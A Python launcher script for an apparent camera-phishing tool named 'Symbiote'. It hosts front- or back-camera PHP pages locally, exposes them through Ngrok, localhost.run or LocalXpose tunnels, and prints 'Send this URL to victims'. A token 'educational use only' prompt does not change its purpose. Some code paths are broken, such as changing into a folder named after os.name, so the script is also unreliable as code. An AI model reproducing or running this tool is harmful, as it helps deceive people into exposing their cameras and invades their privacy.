#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import time
import subprocess
from subprocess import CalledProcessError

# ANSI Colors for terminal formatting
RED, WHITE, CYAN, GREEN, DEFAULT, YELLOW = (
    '\033[1;91m', '\033[0m', '\033[1;36m', '\033[1;32m', 
    '\033[0m', '\033[1;33m'
)
BLINK = '\033[5m'

def clear_screen():
    """Clear terminal screen."""
    os.system('clear' if os.name == 'posix' else 'cls')

def display_agreement():
    """Display tool disclaimer and obtain consent from the user."""
    clear_screen()
    print(f'{YELLOW}----------------------------------')
    print(f'{CYAN}"UNIX IS VERY SIMPLE, IT JUST NEEDS A GENIUS TO UNDERSTAND ITS SIMPLICITY"')
    print(f'{GREEN}~ Dennis Ritchie')
    print(f'{YELLOW}----------------------------------')
    
    consent = input(f"\nDo you agree to use this tool for educational purposes only? {YELLOW}(Y/N)\n{RED}<Symbiote>{YELLOW}---->{CYAN} ").upper()
    if consent != 'Y':
        print(f"\n{RED}You are not authorized to use this tool. Educational use only!")
        exit()

def display_banner():
    """Show the program banner."""
    clear_screen()
    print(f"{GREEN}Welcome to Symbiote Tool!{DEFAULT}\n")

def choose_camera():
    """Prompt user to choose between front or back camera."""
    clear_screen()
    display_banner()
    print(f"{YELLOW}----------------------------------")
    print(f"{CYAN}[ Choose Front Camera or Back Camera ]")
    print(f"{YELLOW}----------------------------------{DEFAULT}")
    print(f"{CYAN}1. Front Camera \n2. Back Camera{DEFAULT}")
    
    choice = input(f"{RED}<Symbiote>{YELLOW}---->{CYAN} ")
    if choice == '1':
        return 'www_f', "You selected Front Camera!"
    elif choice == '2':
        return 'www_b', "You selected Back Camera!"
    else:
        print(f"{RED}Invalid choice. Please try again.")
        return choose_camera()

def choose_port():
    """Prompt user to select a valid port number."""
    while True:
        try:
            port = int(input(f"{RED}<Symbiote>{YELLOW}---->{CYAN} Select a port between 1-65535: "))
            if 1 <= port <= 65535:
                return port
            else:
                print(f"{RED}Invalid port number! Please choose a valid port.")
        except ValueError:
            print(f"{RED}Invalid input! Please enter a number.")

def run_ngrok(port, name):
    """Run the Ngrok server."""
    display_banner()
    print(f"{YELLOW}Setting up Ngrok... Please wait.")
    os.system(f"fuser -k {port}/tcp > /dev/null 2>&1")
    os.system(f"cd Server/{name} && php -S 127.0.0.1:{port} > /dev/null 2>&1 &")
    time.sleep(2)
    os.system(f"./Server/ngrok http {port} > /dev/null &")
    time.sleep(10)
    
    url = extract_url()
    display_server_info('Ngrok', url, port)

def run_localxpose(port, custom=False):
    """Run LocalXpose server, custom or random."""
    display_banner()
    print(f"{YELLOW}Setting up LocalXpose... Please wait.")
    os.system(f"fuser -k {port}/tcp > /dev/null 2>&1")
    os.system(f"cd Server/{os.name} && php -S 127.0.0.1:{port} > /dev/null 2>&1 &")
    
    if custom:
        subdomain = input(f"{RED}<Symbiote>{YELLOW}---->{CYAN} Enter a custom subdomain: ")
        os.system(f"./Server/loclx tunnel --raw-mode http --to :{port} --subdomain {subdomain} > link.url 2>&1 &")
    else:
        os.system(f"./Server/loclx tunnel --raw-mode http --to :{port} > link.url 2>&1 &")
    
    time.sleep(10)
    url = extract_url()
    display_server_info('LocalXpose', url, port)

def run_serveo(port):
    """Run Serveo server."""
    display_banner()
    print(f"{YELLOW}Setting up Serveo... Please wait.")
    os.system(f"fuser -k {port}/tcp > /dev/null 2>&1")
    os.system(f"cd Server/{os.name} && php -S 127.0.0.1:{port} > /dev/null 2>&1 &")
    os.system(f"ssh -R 80:localhost:{port} ssh.localhost.run > link.url 2> /dev/null &")
    
    time.sleep(10)
    url = extract_url()
    display_server_info('Serveo', url, port)

def extract_url():
    """Extract URL from generated tunnel output."""
    try:
        with open('link.url', 'r') as file:
            data = file.read()
        url = re.search(r'(https?://\S+)', data).group(0)
        return url
    except (FileNotFoundError, AttributeError):
        print(f"{RED}Error: Unable to extract URL!")
        return None

def display_server_info(server_name, url, port):
    """Display the server info and generated phishing URL."""
    clear_screen()
    print(f"{YELLOW}---------------------------")
    print(f"{CYAN}[ {server_name} URL ]")
    print(f"{YELLOW}---------------------------")
    if url:
        print(f"{CYAN}Send this URL to victims:\nLocalhost URL: http://127.0.0.1:{port}\n{server_name} URL: {url}{DEFAULT}")
    else:
        print(f"{RED}Error: Unable to generate {server_name} URL. Please try again.{DEFAULT}")

def select_server(port, name):
    """Allow user to choose between available servers."""
    clear_screen()
    display_banner()
    print(f"{YELLOW}----------------------------------")
    print(f"{CYAN}[ Select a Server ]")
    print(f"{YELLOW}----------------------------------")
    print(f"1. Ngrok\n2. Serveo (localhost.run)\n3. LocalXpose")
    
    choice = input(f"{RED}<Symbiote>{YELLOW}---->{CYAN} ")
    if choice == '1':
        run_ngrok(port, name)
    elif choice == '2':
        run_serveo(port)
    elif choice == '3':
        print(f"1. Custom LocalXpose URL\n2. Random LocalXpose URL")
        sub_choice = input(f"{RED}<Symbiote>{YELLOW}---->{CYAN} ")
        run_localxpose(port, custom=(sub_choice == '1'))
    else:
        print(f"{RED}Invalid choice. Try again.")
        select_server(port, name)

def main():
    """Main function to run the tool."""
    display_agreement()
    camera_choice, message = choose_camera()
    print(f"{CYAN}{message}")
    port = choose_port()
    select_server(port, camera_choice)

if __name__ == "__main__":
    main()
